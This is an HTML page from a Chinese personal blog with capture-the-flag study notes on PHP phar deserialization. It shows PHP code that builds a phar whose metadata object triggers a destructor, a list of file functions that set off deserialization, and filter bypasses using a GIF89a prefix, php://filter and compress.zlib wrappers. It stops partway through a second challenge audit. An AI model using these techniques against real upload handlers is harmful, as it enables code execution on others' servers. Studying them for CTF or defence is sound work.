@@ -1,0 +1,815 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    web学习笔记之phar反序列化喵 | Dawn
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish%3A400%2C400italic%2C700%2C700italic%7CNoto+Serif+SC%3A400%2C400italic%2C700%2C700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="Web学习笔记之phar反序列化喵~[TOC] 是的，没错，我又在补作业……（心虚ing） phar是什么喵？phar文件是php里面一种打包文件（类似压缩包），在PHP5.3及更高版本默认开启，意思就是我们可以读取phar文件 如果要生成和使用phar文件时，是通过php代码来生成phar文件的， 在php.ini中需要设置phar.readonly&#x3D;Off 生成phar文件代码类似如下： 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web学习笔记之phar反序列化喵">
+<meta property="og:url" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/index.html">
+<meta property="og:site_name" content="Dawn">
+<meta property="og:description" content="Web学习笔记之phar反序列化喵~[TOC] 是的，没错，我又在补作业……（心虚ing） phar是什么喵？phar文件是php里面一种打包文件（类似压缩包），在PHP5.3及更高版本默认开启，意思就是我们可以读取phar文件 如果要生成和使用phar文件时，是通过php代码来生成phar文件的， 在php.ini中需要设置phar.readonly&#x3D;Off 生成phar文件代码类似如下： 12">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/1.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/2.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/3.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/4.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/5.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/6.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/7.png">
+<meta property="og:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/8.png">
+<meta property="article:published_time" content="2026-02-28T12:57:21.000Z">
+<meta property="article:modified_time" content="2026-03-01T08:23:25.982Z">
+<meta property="article:author" content="Gloria">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="phar反序列化">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/1.png">
+    <link rel="alternate" href="/atom.xml" title="Dawn" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <div class="main-nav-icon icon rotate">
+              &#xe62b;
+          </div>
+          <span class="main-nav-link">Friend</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/19.jpg" alt="web学习笔记之phar反序列化喵">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">web学习笔记之phar反序列化喵</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5"><span class="toc-number">1.</span> <span class="toc-text">Web学习笔记之phar反序列化喵~</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E6%98%AF%E4%BB%80%E4%B9%88%E5%96%B5%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">phar是什么喵？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-0%E6%A0%97%E5%AD%90%E6%A2%A8%E5%AD%90%E6%9D%8E%E5%AD%90%E5%96%B5%E2%9E%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.0栗子梨子李子喵➡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E8%AF%BB%E5%8F%96phar%E6%96%87%E4%BB%B6%E6%97%B6%EF%BC%8C%E5%8F%AF%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">在读取phar文件时，可触发反序列化的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">phar绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-0%E4%BE%8B%E9%A2%98%E5%96%B5%E5%96%B5%E5%96%B5"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.0例题喵喵喵</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Gloria" class="lazyload">
+  <div class="sidebar-author-name">Gloria</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+</div>
+<div class="sidebar-social">
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+            &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-web学习笔记之phar反序列化喵" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-02-28T12:57:21.000Z" itemprop="datePublished">2026-02-28</time>
+    <time style="display: none;" id="post-update-time">2026-03-01</time>
+  </span>
+</div>
+
+        <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记">学习笔记</a>
+  </div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h2 id="Web学习笔记之phar反序列化喵"><a href="#Web学习笔记之phar反序列化喵" class="headerlink" title="Web学习笔记之phar反序列化喵~"></a>Web学习笔记之phar反序列化喵~</h2><p>[TOC]</p>
+<p><del>是的，没错，我又在补作业……（心虚ing）</del></p>
+<h3 id="phar是什么喵？"><a href="#phar是什么喵？" class="headerlink" title="phar是什么喵？"></a>phar是什么喵？</h3><p>phar文件是php里面一种打包文件（类似压缩包），在PHP5.3及更高版本默认开启，意思就是我们可以<strong>读取phar文件</strong></p>
+<p>如果要<strong>生成和使用phar文件</strong>时，是通过php代码来生成phar文件的， 在php.ini中需要设置<code>phar.readonly=Off</code></p>
+<p>生成phar文件代码类似如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;a.phar&#x27;</span>); <span class="comment">//创建一个phar文件，名字为a.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">startBufferng</span>(); <span class="comment">//调用startBuffering这个函数，开始写入东西</span></span><br><span class="line"><span class="comment">/*使用一个名为setStub的方法，这个方法必须以_HALT_COMPILER(); ?&gt;结尾 */</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php _HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;hi&#x27;</span>); <span class="comment">//向phar里添加一个test.txt文件</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test2.txt&#x27;</span>,<span class="string">&#x27;hi2&#x27;</span>); <span class="comment">//添加另一个文件test2.txt</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//结束，保存这个phar文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-0栗子梨子李子喵➡"><a href="#1-0栗子梨子李子喵➡" class="headerlink" title="1.0栗子梨子李子喵➡"></a>1.0栗子梨子李子喵➡</h4><img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/1.png" class="" title="图片正常显示了喵~">
+
+<p>审计一下喵╰(<em>°▽°</em>)╯</p>
+<p>● 有一个类：Flag，存在一个变量password，值为2。当析构的时候，如果password的值为1，就可以得到flag</p>
+<p>● 并且如果<code>phar://upload/f15936d.phar/test.txt</code>这个文件存在，就显示<code>找到了</code>，否则显示没有这个文件，这个文件是需要上传的（.phar文件）</p>
+<p><strong>解题步骤</strong>：利用其它看起来没什么危害的函数<code>file_exists</code>➡接收数据➡反序列化得到一个对象➡在反序列化的过程会触发一些危险函数</p>
+<p>现在我们想触发析构函数，就要用到phar文件的一个特性，即<code>setMetaData</code>这个函数</p>
+<p><code>$phar -&gt;setMetaData();</code>用来设置meta信息，这里的metadata其实是一个对象</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;a.phar&#x27;</span>); <span class="comment">//创建一个phar文件，名字为a.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//调用startBuffering这个函数，开始写入东西</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setMetaData</span>(<span class="keyword">new</span> <span class="title class_">Flag</span>); <span class="comment">//将matadata设置为一个对象</span></span><br><span class="line"><span class="comment">/*使用一个名为setStub的方法，这个方法必须以__HALT_COMPILER(); ?&gt;结尾 */</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;hi&#x27;</span>); <span class="comment">//向phar里添加一个test.txt文件</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test2.txt&#x27;</span>,<span class="string">&#x27;hi2&#x27;</span>); <span class="comment">//添加另一个文件test2.txt</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">stopBuffering</span>(); <span class="comment">//结束，保存这个phar文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果服务端读取了<code>phar://upload/f391f8f.phar/test.txt</code>这个文件，就可能触发反序列化。</p>
+<p>而<strong>metadata</strong>被设置为了一个对象，它是以<strong>序列化的形式储存</strong>在phar文件里面，在被反序列化的时候，就可以触发析构函数，以此得到flag</p>
+<p> 因此，我们运行一下，然后会发现得到了一个phar文件</p>
+<img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/2.png" class="" title="图片正常显示了喵~">
+
+<p>然后我们将其下载，再上传到题目中</p>
+<img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/3.png" class="" title="图片正常显示了喵~">
+
+<p>但是题目是需要上传<code>phar://upload/f15936d.phar/test.txt</code>这个文件才会触发后面的一系列环节，所以我们<strong>修改一下文件名</strong>重新上传即可</p>
+<img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/4.png" class="" title="图片正常显示了喵~">
+
+<p>返回首页就得到flag</p>
+<img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/5.png" class="" title="图片正常显示了喵~">
+
+<h3 id="在读取phar文件时，可触发反序列化的函数"><a href="#在读取phar文件时，可触发反序列化的函数" class="headerlink" title="在读取phar文件时，可触发反序列化的函数"></a>在读取phar文件时，可触发反序列化的函数</h3><p><strong>file</strong></p>
+<ul>
+<li><p>fileatime&#x2F;filectime&#x2F;filemtime➡用于读取文件的修改时间</p>
+</li>
+<li><p>stat&#x2F;fileinode&#x2F;fileowner&#x2F;filegroup&#x2F;fileperms➡用于读取文件的所有者或者所属组或文件的权限</p>
+</li>
+<li><p>file_exists&#x2F;is_dir&#x2F;is_executable&#x2F;is_file&#x2F;is_link&#x2F;is_readable&#x2F;is_writeable&#x2F;is_writable➡判断文件是否存在，是否是目录，时候可执行，是否是文件，是否是链接等等等</p>
+</li>
+<li><p>file&#x2F;file_get_contents&#x2F;readfile&#x2F;fopen➡用于读取文件</p>
+</li>
+<li><p>parse_ini_file➡读取ini配置文件</p>
+</li>
+<li><p>unlink➡删除一个文件</p>
+</li>
+<li><p>copy➡拷贝一个文件</p>
+</li>
+</ul>
+<p><strong>image</strong></p>
+<ul>
+<li><p>exif_thumbnail</p>
+</li>
+<li><p>exif_imagetype</p>
+</li>
+<li><p>imageloadfont</p>
+</li>
+<li><p>imagecreatefrom***</p>
+</li>
+<li><p>getimagesize</p>
+</li>
+<li><p>getimagesizefromstring</p>
+</li>
+</ul>
+<p><strong>hash</strong></p>
+<ul>
+<li><p>hash_hmac_file</p>
+</li>
+<li><p>hash_file</p>
+</li>
+<li><p>hash_update_file</p>
+</li>
+<li><p>md5_file</p>
+</li>
+<li><p>sha1_file</p>
+</li>
+</ul>
+<p><strong>file&#x2F;url</strong></p>
+<ul>
+<li><p>get_meta_tags</p>
+</li>
+<li><p>get_headers</p>
+</li>
+</ul>
+<h3 id="phar绕过"><a href="#phar绕过" class="headerlink" title="phar绕过"></a>phar绕过</h3><p><strong>➡图片检查</strong></p>
+<p>如果网站不允许上传phar这种危险文件，只允许上传图片，我们可以修改phar文件的后缀，<strong>a.phar可以修改为a.png、a.gif或者a.jpg</strong></p>
+<p>如果他要读取文件内容检查的话，可以选择在文件<strong>开头添加GIF89a</strong>，伪装成gif图片，如</p>
+<p><code>$phar -&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);</code></p>
+<p><strong>➡不允许phar:&#x2F;&#x2F;开头</strong></p>
+<ul>
+<li><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;a.phar&#x2F;test1.txt</p>
+</li>
+<li><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;a.phar&#x2F;test1.txt</p>
+<p><strong>压缩协议</strong></p>
+</li>
+<li><p>compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;a.phar&#x2F;test1.txt</p>
+</li>
+<li><p>compress.bzip:&#x2F;&#x2F;phar:&#x2F;&#x2F;a.phar&#x2F;test1.txt</p>
+</li>
+<li><p>compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;a.phar&#x2F;test1.txt</p>
+</li>
+</ul>
+<h4 id="2-0例题喵喵喵"><a href="#2-0例题喵喵喵" class="headerlink" title="2.0例题喵喵喵"></a>2.0例题喵喵喵</h4><img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/6.png" class="" title="图片正常显示了喵~">
+
+<p>好吧好吧，一眼看上去，后缀过滤还有一个计算哈希值的函数，但是具体代码是什么，使用f12未查看到</p>
+<p>想要源代码的话，可以尝试看看是否有<strong>源码泄露</strong>（扫一下或者手动尝试，如index.php~、<a target="_blank" rel="noopener" href="http://www.zip之类的)/">www.zip之类的）</a></p>
+<p>这里的是<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<img src="/2026/02/28/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%96%B5/7.png" class="" title="图片正常显示了喵~">
+
+<p>查看hash.php</p>
+<p>得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password === <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能以phar://开头</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPhar</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$path</span>, <span class="string">&#x27;phar://&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filePath</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">isPhar</span>(<span class="variable">$filePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;不能以phar://开头&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">sha1_file</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请提供文件路径&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>审计➡</p>
+<p>依旧flag类，析构时password值为1时得到flag</p>
+<p>检测phar:&#x2F;&#x2F;头，存在<code>sha1_file</code>函数，依旧触发反序列化 </p>
